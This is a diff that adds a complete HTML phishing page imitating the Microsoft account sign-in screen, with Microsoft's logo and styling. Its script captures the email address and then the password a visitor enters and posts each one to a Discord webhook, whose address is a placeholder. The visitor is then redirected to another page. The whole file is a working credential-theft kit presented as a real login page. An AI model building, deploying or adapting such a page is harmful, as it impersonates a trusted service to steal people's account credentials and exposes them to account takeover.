@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('bckg.png') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .signin-container {
+            background-color: #ffffff;
+            padding: 40px;
+            width: 340px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            border-radius: 4px;
+            position: relative;
+            transition: transform 0.5s ease;
+        }
+
+        .logo {
+            width: 108px;
+            height: auto;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 8px 10px;
+            font-size: 15px;
+            border: 1px solid #8e8e8e;
+            margin-bottom: 16px;
+            border-radius: 2px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+        }
+
+        .links {
+            margin-bottom: 22px;
+            font-size: 12px;
+        }
+
+        .links span {
+            color: #666;
+        }
+
+        .links a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        button {
+            padding: 6px 16px;
+            font-size: 15px;
+            cursor: pointer;
+            border: none;
+            min-width: 88px;
+            height: 32px;
+            border-radius: 2px;
+        }
+
+        #back {
+            background-color: #f3f3f3;
+            color: #666;
+            border: 1px solid #c3c3c3;
+            margin-right: 8px;
+        }
+
+        #next {
+            background-color: #0078d4;
+            color: #ffffff;
+        }
+
+        #next:hover {
+            background-color: #005da6;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        /* Slide animations */
+        .slide-right {
+            transform: translateX(100%);
+        }
+
+        .slide-left {
+            transform: translateX(-100%);
+        }
+
+        .slide-in {
+            transform: translateX(0);
+        }
+
+        .hide {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="signin-container" id="signin-container">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo" class="logo">
+        <h1>Sign in</h1>
+        <input type="text" placeholder="Email, phone, or Skype" id="username">
+        <div class="links">
+            <span>No account? </span><a href="cantcon.html">Create one!</a><br>
+            <a href="cantcon.html">Can't access your account?</a>
+        </div>
+        <div class="buttons">
+            <button id="back">Back</button>
+            <button id="next">Next</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        Terms of use Privacy & cookies ...
+    </div>
+
+    <script>
+        const webhookUrl = 'yourwebhook';  
+        const nextButton = document.getElementById('next');
+        const backButton = document.getElementById('back');
+        const inputField = document.getElementById('username');
+        const signinContainer = document.getElementById('signin-container');
+        let isEmailEntered = false;
+
+        // Handle the "Next" button (slide to the right)
+        nextButton.addEventListener('click', () => {
+            const value = inputField.value;
+
+            signinContainer.classList.add('slide-right');
+
+            setTimeout(() => {
+                signinContainer.classList.remove('slide-right');
+                signinContainer.classList.add('slide-in');
+
+                if (!isEmailEntered) {
+                    // Send email to Discord webhook
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: `Email entered: ${value}`
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Email sent to Discord webhook');
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+
+                    // Update UI to ask for password
+                    inputField.value = '';
+                    inputField.setAttribute('type', 'password');
+                    inputField.setAttribute('placeholder', 'Enter your password');
+                    isEmailEntered = true;
+                } else {
+                    // Send password to Discord webhook
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: `Password entered: ${value}`
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Password sent to Discord webhook');
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+
+                    // Redirect to cantcon.html after entering password
+                    window.location.href = 'cantcon.html';
+                }
+            }, 500); // Transition delay for the sliding effect
+        });
+
+        // Handle the "Back" button (slide to the left)
+        backButton.addEventListener('click', () => {
+            signinContainer.classList.add('slide-left');
+
+            setTimeout(() => {
+                signinContainer.classList.remove('slide-left');
+                signinContainer.classList.add('slide-in');
+
+                // Simulate going back (resetting the form to email input)
+                inputField.value = '';
+                inputField.setAttribute('type', 'text');
+                inputField.setAttribute('placeholder', 'Email, phone, or Skype');
+                isEmailEntered = false;
+            }, 500); // Transition delay for the sliding effect
+        });
+    </script>
+</body>
+</html>
